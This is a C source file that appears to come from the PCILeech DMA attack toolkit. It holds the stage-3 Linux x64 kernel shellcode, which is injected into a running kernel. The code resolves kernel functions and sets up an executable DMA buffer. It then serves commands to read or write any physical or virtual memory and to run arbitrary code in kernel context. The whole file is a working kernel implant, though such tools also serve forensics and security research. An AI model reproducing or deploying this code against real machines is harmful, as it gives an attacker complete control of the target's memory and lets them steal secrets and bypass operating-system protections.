// lx64_stage3_c.c : stage3 main shellcode.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

extern QWORD SysVCall(QWORD fn, ...);
extern QWORD LookupFunctions(QWORD qwAddr_KallsymsLookupName, QWORD qwAddr_FNLX);
extern QWORD m_phys_to_virt(QWORD p1);
extern QWORD m_page_to_phys(QWORD p1);

typedef struct _PHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct _TIMEVAL {
	QWORD tv_sec;
	QWORD tv_usec;
} TIMEVAL, *PTIMEVAL;

typedef struct _RESOURCE {
	QWORD start;
	QWORD end;
	const char *name;
	QWORD flags;
	QWORD parent, sibling, child;
} RESOURCE, *PRESOURCE;

typedef struct tdFNLX { // VOID definitions for LINUX functions (used in main control program)
	QWORD kallsyms_lookup_name;
	QWORD msleep;
	QWORD alloc_pages_current;
	QWORD set_memory_x;
	QWORD __free_pages;
	QWORD memcpy;
	QWORD schedule;
	QWORD do_gettimeofday;
	QWORD iomem_open;
	QWORD ReservedFutureUse[23];
} FNLX, *PFNLX;

#define KMDDATA_OPERATING_SYSTEM_LINUX			0x02

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 002
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/OSX).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] virtual address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD;				// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[20];	// [0x060] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra in-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra in-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNLX fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

/*
* Retrieve system memory ranges from the iomem_resource structure.
*/
BOOL SetMemoryRanges(PKMDDATA pk)
{
	PPHYSICAL_MEMORY_RANGE pmr;
	PRESOURCE r;
	QWORD i = 0;
	// 0: find iomem_resource structure by pattern search of function binary
	while(*(PDWORD)(pk->fn.iomem_open + i) != 0x8082c748) {
		if(++i > 0x40) {
			return FALSE;
		}
	}
	r = (PRESOURCE)(0xffffffff00000000 + *(PDWORD)(pk->fn.iomem_open + i + 7));
	// 1: move to child and set up info
	if(!r->child) {
		return FALSE;
	}
	r = (PRESOURCE)r->child;
	pmr = (PPHYSICAL_MEMORY_RANGE)pk->DMAAddrVirtual;
	i = 0;
	while(r) {
		if(*(PQWORD)r->name == 0x52206d6574737953) { // 0x52206d6574737953 == "System R" [first 8 chars of "System RAM"
			// found!
			if(i && (r->start == pmr[i - 1].BaseAddress + pmr[i - 1].NumberOfBytes)) {
				// merge
				i--;
				pmr[i].NumberOfBytes += r->end + 1 - r->start;
			} else {
				// new
				pmr[i].BaseAddress = r->start;
				pmr[i].NumberOfBytes = r->end + 1 - r->start;
			}
			pmr[i].NumberOfBytes &= ~0xfff;
			i++;
		}
		r = (PRESOURCE)r->sibling;
	}
	pk->_size = i * sizeof(PHYSICAL_MEMORY_RANGE);
	return TRUE;
}

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	QWORD pStructPages, qwBufferOutDMA, qwMM;
	TIMEVAL timeLast, timeCurrent;
	// 0: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_LINUX;
	if(!LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)&pk->fn)) {
		pk->_status = 0xf0000001;
		return;
	}
	// 1: set up mem out dma area 4MB in lower 4GB (linux does not support std 16MB)
	pStructPages = SysVCall(pk->fn.alloc_pages_current, 0x14, 10);
	if(!pStructPages) {
		pk->_status = 0xf0000002;
		return;
	}
	pk->DMAAddrPhysical = m_page_to_phys(pStructPages);
	pk->DMAAddrVirtual = qwBufferOutDMA = m_phys_to_virt(pk->DMAAddrPhysical);
	pk->DMASizeBuffer = 0x400000;
	SysVCall(pk->fn.set_memory_x, qwBufferOutDMA, 1024);
	// 2: main dump loop
	SysVCall(pk->fn.do_gettimeofday, &timeLast);
	while(TRUE) {
		pk->_status = 1;
		SysVCall(pk->fn.schedule); // kernel yield - avoid stuck thread
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			SysVCall(pk->fn.do_gettimeofday, &timeCurrent);
			if(timeCurrent.tv_sec > timeLast.tv_sec + 5) {
				SysVCall(pk->fn.msleep, 100); // sleep after 5 seconds
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			SysVCall(pk->fn.__free_pages, pStructPages, 10);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = SetMemoryRanges(pk);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))qwBufferOutDMA)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			qwMM = m_phys_to_virt(pk->_address);
			if(KMD_CMD_READ == pk->_op) { // READ
				SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, qwMM, pk->_size);
			} else { // WRITE
				SysVCall(pk->fn.memcpy, qwMM, pk->DMAAddrVirtual, pk->_size);
			}
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, qwBufferOutDMA, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, qwBufferOutDMA, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		SysVCall(pk->fn.do_gettimeofday, &timeLast);
	}
}